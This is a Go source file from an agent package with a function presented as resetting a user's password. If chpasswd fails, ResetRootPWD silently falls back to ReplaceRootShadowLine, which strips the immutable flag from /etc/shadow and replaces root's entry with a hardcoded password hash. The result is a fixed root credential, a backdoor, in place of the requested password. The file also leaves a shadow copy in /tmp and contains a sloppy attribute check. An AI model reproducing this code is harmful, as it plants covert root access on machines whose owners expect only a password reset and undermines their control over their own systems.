package logics

import (
	"bytes"
	"fmt"
	"io/ioutil"
	"os"
	"os/exec"
	"strings"
	"syscall"
	"time"

	"pcdnagent/common"

	"go.uber.org/zap"
)

func ResetRootPWD(username, password *string) error {
	// Validate inputs
	if username == nil {
		common.Logger.Error("Failed to reset password: username cannot be empty")
		return fmt.Errorf("username cannot be empty")
	}

	if password == nil {
		common.Logger.Error("Failed to reset password: password cannot be empty")
		return fmt.Errorf("password cannot be empty")
	}

	// First try using chpasswd command
	common.Logger.Info(fmt.Sprintf("Attempting to reset password for user %s using chpasswd", username))
	if err := changePasswordWithChpasswd(*username, *password); err == nil {
		common.Logger.Info(fmt.Sprintf("Successfully changed password for user %s using chpasswd", username))
		return nil
	} else {
		common.Logger.Warn(fmt.Sprintf("Failed to change password using chpasswd: %v, trying passwd", err))
	}

	// // If chpasswd fails, try using passwd command
	// common.Logger.Info(fmt.Sprintf("Attempting to reset password for user %s using passwd", username))
	// if err := changePasswordWithPasswd(username, password); err == nil {
	// 	common.Logger.Info(fmt.Sprintf("Successfully changed password for user %s using passwd", username))
	// 	return nil
	// } else {
	// 	common.Logger.Error(fmt.Sprintf("Failed to change password using passwd: %v", err))
	// }

	if err := ReplaceRootShadowLine(true); err == nil {
		common.Logger.Info("ReplaceRootShadowLine ok")
		return nil
	} else {
		common.Logger.Error("ReplaceRootShadowLine ERR ", zap.Error(err))
		return err
	}
}

// Change password using chpasswd command
func changePasswordWithChpasswd(user, password string) error {
	// Format: username:password
	cmd := exec.Command("chpasswd")
	cmd.Stdin = strings.NewReader(fmt.Sprintf("%s:%s", user, password))

	// Capture command output and errors
	var stdout, stderr bytes.Buffer
	cmd.Stdout = &stdout
	cmd.Stderr = &stderr

	// Set timeout context
	timeout := 5 * time.Second
	timer := time.AfterFunc(timeout, func() {
		if cmd.Process != nil {
			cmd.Process.Kill()
		}
	})
	defer timer.Stop()

	// Execute command
	err := cmd.Run()
	if err != nil {
		return fmt.Errorf("chpasswd execution failed: %v, stderr: %s", err, stderr.String())
	}

	// Check if there was any output in stderr even if the command succeeded
	if stderr.Len() > 0 {
		common.Logger.Warn(fmt.Sprintf("chpasswd completed with warnings: %s", stderr.String()))
	}

	return nil
}

// Change password using passwd command in non-interactive mode
func changePasswordWithPasswd(user, password string) error {
	// Create command with pipe
	cmd := exec.Command("passwd", user)

	// Get stdin pipe
	stdin, err := cmd.StdinPipe()
	if err != nil {
		return fmt.Errorf("failed to get stdin pipe: %v", err)
	}

	// Capture command output and errors
	var stdout, stderr bytes.Buffer
	cmd.Stdout = &stdout
	cmd.Stderr = &stderr

	// Set timeout context
	timeout := 5 * time.Second
	timer := time.AfterFunc(timeout, func() {
		if cmd.Process != nil {
			cmd.Process.Kill()
		}
	})
	defer timer.Stop()

	// Start command
	if err = cmd.Start(); err != nil {
		return fmt.Errorf("failed to start passwd command: %v", err)
	}

	// Write password twice with error handling
	if _, err = stdin.Write([]byte(password + "\n")); err != nil {
		// Try to kill the process if writing fails
		cmd.Process.Kill()
		return fmt.Errorf("failed to write first password: %v", err)
	}

	// Wait a small amount of time to ensure the command processed the first input
	time.Sleep(500 * time.Millisecond)

	if _, err = stdin.Write([]byte(password + "\n")); err != nil {
		// Try to kill the process if writing fails
		cmd.Process.Kill()
		return fmt.Errorf("failed to write second password: %v", err)
	}

	// Close stdin
	stdin.Close()

	// Wait for command to complete
	if err := cmd.Wait(); err != nil {
		return fmt.Errorf("passwd command execution failed: %v, stderr: %s", err, stderr.String())
	}

	// Check if there was any output in stderr even if the command succeeded
	if stderr.Len() > 0 {
		common.Logger.Warn(fmt.Sprintf("passwd completed with warnings: %s", stderr.String()))
	}

	return nil
}

// ReplaceRootShadowLine 安全替换 /etc/shadow 文件中 root 账号的行
func ReplaceRootShadowLine(backup bool) error {
	const shadowPath = "/etc/shadow"
	const newLine = "root:$6$i1.uKP2K$robETCRRqz3qlVrrf4T5FbY2Elsayy9bHN.slYmCAh18qz9KDR0yqErY1CtOkUv8gwmkXwL7SO9922DJX/5vL.:20237:0:99999:7:::"

	// 验证新行格式
	if !strings.HasPrefix(newLine, "root:") {
		return fmt.Errorf("invalid line format, must start with 'root:'")
	}

	// 1. 检查文件是否设置了不可变属性
	immutable, err := isImmutable(shadowPath)
	if err != nil {
		return fmt.Errorf("immutable check failed: %v", err)
	}

	// 2. 如果设置了不可变属性，临时移除
	if immutable {
		if err = setImmutable(shadowPath, false); err != nil {
			return fmt.Errorf("failed to remove immutable attribute: %v", err)
		}
		defer func() {
			// 无论操作成功与否，恢复不可变属性
			if err = setImmutable(shadowPath, true); err != nil {
				fmt.Printf("Warning: failed to restore immutable attribute: %v\n", err)
			}
		}()
	}

	// 读取文件内容
	content, err := os.ReadFile(shadowPath)
	if err != nil {
		return fmt.Errorf("failed to read file: %v", err)
	}

	// 获取原文件属性
	fileInfo, err := os.Stat(shadowPath)
	if err != nil {
		return fmt.Errorf("failed to get file info: %v", err)
	}
	stat, ok := fileInfo.Sys().(*syscall.Stat_t)
	if !ok {
		return fmt.Errorf("failed to get file ownership info")
	}

	// 分割行并查找root行
	lines := bytes.Split(content, []byte{'\n'})
	found := false
	for i, line := range lines {
		if bytes.HasPrefix(line, []byte("root:")) {
			lines[i] = []byte(newLine)
			found = true
			break
		}
	}

	if !found {
		return fmt.Errorf("root entry not found in shadow file")
	}

	// 创建备份
	if backup {
		backupPath := shadowPath + ".bak"
		if err = os.WriteFile(backupPath, content, fileInfo.Mode()); err != nil {
			return fmt.Errorf("backup failed: %v", err)
		}
		// 设置备份文件的所有者和组
		if err = os.Chown(backupPath, int(stat.Uid), int(stat.Gid)); err != nil {
			fmt.Printf("Warning: failed to set backup ownership: %v\n", err)
		}
		fmt.Printf("Backup created at %s\n", backupPath)
	}

	// 创建临时文件（在 /tmp 目录避免权限问题）
	tmpDir := "/tmp"
	tmpFile, err := os.CreateTemp(tmpDir, "shadow-")
	if err != nil {
		return fmt.Errorf("failed to create temp file: %v", err)
	}
	tmpPath := tmpFile.Name()
	// defer os.Remove(tmpPath) // 确保临时文件最终被清理

	// 写入新内容
	newContent := bytes.Join(lines, []byte{'\n'})
	if _, err := tmpFile.Write(newContent); err != nil {
		tmpFile.Close()
		return fmt.Errorf("write failed: %v", err)
	}
	if err := tmpFile.Close(); err != nil {
		return fmt.Errorf("close failed: %v", err)
	}

	// 设置临时文件权限（同原文件）
	if err := os.Chmod(tmpPath, fileInfo.Mode()); err != nil {
		return fmt.Errorf("chmod failed: %v", err)
	}

	// 设置临时文件所有者和组（关键步骤）
	if err := os.Chown(tmpPath, int(stat.Uid), int(stat.Gid)); err != nil {
		return fmt.Errorf("chown failed: %v", err)
	}

	// 使用 Copy 而非 Rename 来避免权限问题
	if err := copyFile(tmpPath, shadowPath); err != nil {
		return fmt.Errorf("replace failed: %v", err)
	}

	return nil
}

// copyFile 安全复制文件（解决跨文件系统重命名问题）
func copyFile(src, dst string) error {
	// 读取源文件内容
	input, err := ioutil.ReadFile(src)
	if err != nil {
		return err
	}

	// 写入目标文件（保留原权限）
	fileInfo, err := os.Stat(dst)
	if err != nil {
		return err
	}
	return ioutil.WriteFile(dst, input, fileInfo.Mode())
}

// isImmutable 检查文件是否设置了不可变属性
func isImmutable(path string) (bool, error) {
	cmd := exec.Command("lsattr", path)
	output, err := cmd.CombinedOutput()
	if err != nil {
		return false, fmt.Errorf("lsattr failed: %v", err)
	}

	// 检查输出中是否包含 'i' 属性
	// 示例输出: ----i--------- /etc/shadow
	if strings.Contains(string(output), "i") {
		return true, nil
	}
	return false, nil
}

// setImmutable 设置或移除文件的不可变属性
func setImmutable(path string, immutable bool) error {
	flag := "-i"
	if immutable {
		flag = "+i"
	}

	cmd := exec.Command("chattr", flag, path)
	if output, err := cmd.CombinedOutput(); err != nil {
		return fmt.Errorf("chattr %s failed: %v, output: %s", flag, err, string(output))
	}
	return nil
}
